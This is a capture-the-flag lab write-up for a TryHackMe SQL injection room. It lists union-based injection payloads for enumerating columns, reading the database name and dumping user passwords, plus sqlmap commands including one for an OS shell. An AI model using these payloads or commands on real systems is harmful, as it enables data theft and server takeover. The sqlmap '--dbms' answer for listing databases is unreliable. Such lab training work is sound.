# SQL Injection
Learn to perform SQLi attacks in the most effective way!  
https://tryhackme.com/room/sqlibasics  
  
****

# [Task 1- 6] Educational

No answers needed.
  
# [Task 7] Unit 7 - Union Based SQLi

**#1 How many columns are being returned by the query?**  
  
From the lesson we learned to add 'NULL' until we no longer got an error. I stopped getting an error at 6 meaning there were 5 columns.  
  
```sql
' UNION SELECT NULL -- //
```
```sql
' UNION SELECT NULL,NULL -- //
```
```sql
' UNION SELECT NULL,NULL,NULL -- //
```
```sql
' UNION SELECT NULL,NULL,NULL,NULL -- //
```
```sql
' UNION SELECT NULL,NULL,NULL,NULL,NULL -- //
```

Answer: 5

**#2 How many of these columns can accept strings? ('a')**  
  
From the lesson we learned to to replace NULL with a string if we didn't get an error than the field is a string.  
```sql
' UNION SELECT 'a',NULL,NULL,NULL,NULL -- //
```
```sql
' UNION SELECT 'a','a',NULL,NULL,NULL -- //
```
```sql
' UNION SELECT 'a','a','a',NULL,NULL -- //
```
```sql
' UNION SELECT 'a','a','a','a',NULL -- //
```
```sql
' UNION SELECT 'a','a','a','a','a' -- //
```

Answer: 5

**#3 What's the database name?**  
  
From the lesson we learned a few things that may be interesting one of them was 'database()' so i tried that. I noticed even though there were 5 columns there were only 4 on the webpage. Through trial and error i fond out that the first column didnt show up on the webpage.  
```sql
' UNION SELECT NULL,database(),NULL,NULL,NULL -- //
```

Answer: sqlitraining

**#4 (Optional) Dump all users and passwords**

I got lucky and guessed the database name was users my first try.

```sql
' UNION SELECT * FROM users -- //
```

# [Task 8] Unit 8 - Automating exploitation
 Install sqlmap by following the lesson. 

**#1 How would you get an OS shell on website "sqli.thm/login.php"? (URL switch comes first)**

 ```bash
 sqlmap -u "sqli.thm/login.php" --os-shell
 ```

**#2 What about listing all databases on the same website? (URL switch comes first)**

```bash
sqlmap -u "sqli.thm/login.php" --dbms
```
